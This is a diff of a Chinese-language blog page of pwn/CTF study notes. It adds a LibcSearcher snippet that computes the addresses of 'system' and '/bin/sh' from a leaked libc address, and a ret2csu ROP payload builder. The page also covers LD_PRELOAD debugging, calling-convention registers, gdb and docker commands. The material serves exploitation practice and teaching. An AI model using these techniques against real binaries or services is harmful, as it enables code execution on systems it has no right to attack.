@@ -9,13 +9,9 @@
   <title>常忘基础知识 | winter - 像初雪一样自由洒落</title>
   <meta name="author" content="winter">
   
-  <meta name="description" content="64位传参参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9
-栈帧
-查看内存命令用gdb查看内存
-格式: x /nfu
-说明 x 是 examine 的缩写
-n表示要显示的内存单元的个数
-f表示显示方式, 可取如下值 x 按十六进制格式显示变量。 d 按十进制格式显示变量">
+  <meta name="description" content="LibcSearcher安装123git clone https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;lieanu&amp;#x2F;LibcSearcher.gitcd LibcSearcherpython setup.py develop	&amp;#x2F;&amp;#x2F;使用root
+
+12">
   
   
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
@@ -141,7 +137,18 @@ var _hmt = _hmt || [];
 	<div class="mypage">		
 	  		
 
-	  <h3 id="64位传参"><a href="#64位传参" class="headerlink" title="64位传参"></a>64位传参</h3><p>参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9</p>
+	  <h3 id="LibcSearcher"><a href="#LibcSearcher" class="headerlink" title="LibcSearcher"></a>LibcSearcher</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;lieanu&#x2F;LibcSearcher.git</span><br><span class="line">cd LibcSearcher</span><br><span class="line">python setup.py develop	&#x2F;&#x2F;使用root</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">obj = LibcSearcher(<span class="string">"read"</span>,addr)					<span class="comment">#已经泄漏的函数地址</span></span><br><span class="line">libc_base = addr - obj.dump(<span class="string">'read'</span>)</span><br><span class="line">system_addr = obj.dump(<span class="string">"system"</span>) + libc_base		<span class="comment">#计算其他地址</span></span><br><span class="line">print(<span class="string">"system:"</span>+hex(system_addr))</span><br><span class="line">binsh_addr = obj.dump(<span class="string">"str_bin_sh"</span>) + libc_base</span><br><span class="line">print(<span class="string">"binsh_addr:"</span>+hex(binsh_addr))</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h3><p>#因为是edi，而binsh在libc里面的地址是0x7f开头的八位，所以不能直接用</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">com_gadget</span><span class="params">(part1, part2, jmp2, arg1 = <span class="number">0x0</span>, arg2 = <span class="number">0x0</span>, arg3 = <span class="number">0x0</span>)</span>:</span></span><br><span class="line">	payload  = p64(part1)			<span class="comment"># part1 entry pop_rbx_rbp_r12_r13_r14_r15_ret</span></span><br><span class="line">	payload += p64(<span class="number">0x0</span>)			<span class="comment"># rbx must be 0x0</span></span><br><span class="line">	payload += p64(<span class="number">0x1</span>)			<span class="comment"># rbp must be 0x1</span></span><br><span class="line">	payload += p64(jmp2)			<span class="comment"># r12 jump to</span></span><br><span class="line">	payload += p64(arg3)			<span class="comment"># r13  -&gt; rdx    arg3</span></span><br><span class="line">	payload += p64(arg2)			<span class="comment"># r14  -&gt; rsi    arg2</span></span><br><span class="line">	payload += p64(arg1)			<span class="comment"># r15d -&gt; edi    arg1</span></span><br><span class="line">	payload += p64(part2)			<span class="comment"># part2 entry will call [r12+rbx*0x8]</span></span><br><span class="line">	payload += <span class="string">'A'</span> * <span class="number">56</span>			<span class="comment"># junk 6*8+8=56</span></span><br><span class="line">	<span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="64位传参"><a href="#64位传参" class="headerlink" title="64位传参"></a>64位传参</h3><p>参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9</p>
 <h3 id="栈帧"><a href="#栈帧" class="headerlink" title="栈帧"></a>栈帧</h3><p><img src="/2020/11/07/%C2%96%E5%B8%B8%E5%BF%98%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/u=465806655,3876495324&fm=26&gp=0.jpg" alt="点击查看源网页"></p>
 <h3 id="查看内存命令"><a href="#查看内存命令" class="headerlink" title="查看内存命令"></a>查看内存命令</h3><p>用gdb查看内存</p>
 <p>格式: x /nfu</p>
@@ -260,6 +267,17 @@ var _hmt = _hmt || [];
 </ul>
 </li>
 </ul>
+<h4 id="题目给定"><a href="#题目给定" class="headerlink" title="题目给定"></a>题目给定</h4><p><strong>查看版本</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings libc.so | grep GNU</span><br></pre></td></tr></table></figure>
+
+<p>查看该版本与本地是否相同</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">diff libc.so &#x2F;lib&#x2F;x86..&#x2F;libc-2.27.so</span><br></pre></td></tr></table></figure>
+
+<p><code>Binary files libc-2.27.so and /lib/x86_64-linux-gnu/libc-2.27.so differ</code></p>
+<p>表示该libc与本地环境不同，故调试的时候，需要加</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">io &#x3D; process([&#39;.&#x2F;bin&#39;],env&#x3D;&#123;&quot;LD_PRELOAD&quot;:&quot;.&#x2F;libc-2.23.so&quot;&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>来加载，其中[‘./bin’]替换为你需要调试的二进制文件名，”./libc-2.23.so”替换成你需要加载的目标libc，这样本地调试就可以通过目标libc进行了。</p>
 <h3 id="寄存器参数"><a href="#寄存器参数" class="headerlink" title="寄存器参数"></a>寄存器参数</h3><p>%rdi, %rsi, %rdx, %rcx, %r8, %r9 </p>
 <h3 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h3><p>进入容器的几种方法：<br>    1、exec<br>      通过docker ps 查看需要进入的容器pid<br>      执行<br>        docker exec -it 246f35c432de /bin/bash<br>      退出容器，不会关闭容器，一般使用这个方法。<br>    2、attach<br>      通过docker ps 查看需要进入的容器pid<br>      docker attach pid<br>      退出容器会关闭容器，不推荐</p>
 <p>Docker进入容器的几种方法：<a href="https://blog.csdn.net/czy_6837/article/details/84325166?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.add_param_isCf&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.add_param_isCf" target="_blank" rel="noopener">https://blog.csdn.net/czy_6837/article/details/84325166?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.add_param_isCf&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.add_param_isCf</a></p>
@@ -407,7 +425,7 @@ var _hmt = _hmt || [];
     <ul id="categorys" class="tag_box list-unstyled collapse in">
           
   <li>
-    <li><a href="/categories/pwn/">pwn<span>7</span></a></li>
+    <li><a href="/categories/pwn/">pwn<span>8</span></a></li>
   </li>
 
     </ul>
@@ -420,7 +438,7 @@ var _hmt = _hmt || [];
 	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
     <ul id="tags" class="tag_box list-unstyled collapse in">	  
 	    
-  <li><a href="/tags/基础知识/">基础知识<span>2</span></a></li>
+  <li><a href="/tags/基础知识/">基础知识<span>3</span></a></li>
     </ul>
 	</div>
 		
